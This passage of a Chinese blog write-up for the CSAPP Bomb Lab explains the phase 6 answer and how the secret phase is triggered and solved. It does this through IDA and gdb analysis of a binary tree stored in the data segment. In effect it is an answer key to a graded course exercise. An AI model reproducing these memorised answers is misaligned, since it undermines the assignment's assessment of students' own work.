<p>所以最终的排序是924 &gt; 691 &gt; 477 &gt; 443 &gt; 332 &gt; 168，即<code>3 4 5 6 1 2</code>。</p>
<p>别忘记了前面有一个<code>x = 7 - x;</code>，所以最终的答案就是<code>4 3 2 1 6 5</code>。</p>
<h2 id="secret-phase"><a href="#secret-phase" class="headerlink" title="secret phase"></a>secret phase</h2><p><del>待补充，今天晚点再做了补上。（咕咕咕）</del></p>
<p>Jan 15 upd：来补上secret phase了！</p>
<h3 id="怎么进secret-phase"><a href="#怎么进secret-phase" class="headerlink" title="怎么进secret phase"></a>怎么进secret phase</h3><p><code>secret_phase</code>函数的入口其实在<code>phase_defused</code>里面。</p>
<p>懒得看汇编，直接用IDA Pro做了。<del>其实反汇编出来的跟看汇编也差不多</del></p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Bomb-Lab-Writeup/phase_defused(IDA).png">
<p>这里看到一个<code>num_input_strings</code>，是个在bss段上的全局变量。同时，<code>sscanf</code>所读入的那个地址，也是在bss段上的，初始化都是0，不过可能会在函数执行的时候被修改。</p>
<p>那到底是什么时候被修改的？我们分别用gdb设断点看一看。</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Bomb-Lab-Writeup/secret_phase(num_input_strings).png">
<p>可以发现这个变量的意思就是记录现在是第几关。所以当第六关的时候就可以了。</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Bomb-Lab-Writeup/secret_phase(input_strings).png">
<p>可以发现是我们在打phase 4的时候，这个<code>input_strings + 240</code>所在的字符串就更改成了我们输入的内容。并且后面不会再更改。</p>
<p>所以我们只需要在第四阶段，在第三个位置上输入一个<code>DrEvil</code>，就可以在过完第六关之后触发了。</p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Bomb-Lab-Writeup/secret_phase(IDA).png">
<p>要使这个<code>func7</code>返回2，并且输入的数字小于等于0x3e8 + 1，就可以通关了。</p>
<p>这里有一个<code>&amp;n1</code>，点进去看看，又是在data段，跟前面的<code>&amp;node1</code>很类似。并且，<code>n1</code>后面也紧跟着其他类似的东西，应该又是一个struct。</p>
<p>我们用gdb看一看：</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Bomb-Lab-Writeup/secret_phase(n1).png">
<p>可以发现，每个结构体储存了两个地址，我们做下笔记：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">n1(n21, n22)  36</span><br><span class="line">n21(n31, n32) 8</span><br><span class="line">n22(n33, n34) 50</span><br><span class="line">n32(n43, n44) 22</span><br><span class="line">n33(n45, n46) 45</span><br><span class="line">n31(n41, n42) 6</span><br><span class="line">n34(n47, n48) 107</span><br><span class="line">n45 40</span><br><span class="line">n41 1</span><br><span class="line">n47 99</span><br><span class="line">n44 35</span><br><span class="line">n42 7</span><br><span class="line">n43 20</span><br><span class="line">n46 47</span><br><span class="line">n48 1001</span><br></pre></td></tr></table></figure>
<p>这种一对二的关系，其实就是二叉树：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">                n1</span><br><span class="line">      n21             n22</span><br><span class="line">  n31     n32     n33     n34</span><br><span class="line">n41 n42 n43 n44 n45 n46 n47 n48</span><br></pre></td></tr></table></figure>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Bomb-Lab-Writeup/func7(IDA).png">
<p>想让<code>func7</code>为2，首先要落向左边，然后落向右边，然后返回0，这样就能构造出<code>2 * (2 * 0 + 1) = 2</code>了。</p>
<p>最后的返回0，也可以走左边再返回0，所以<code>n32</code>和<code>n43</code>的值都是没问题的，即我们有20跟22两个答案。</p>
<p>终于通关了！芜湖起飞！</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Bomb-Lab-Writeup/success.png">
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Bomb-Lab-Writeup/success1.png">
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Bomb-Lab-Writeup/success2.png">
]]></content>
      <tags>
        <tag>CSAPP</tag>
      </tags>
  </entry>
</search>
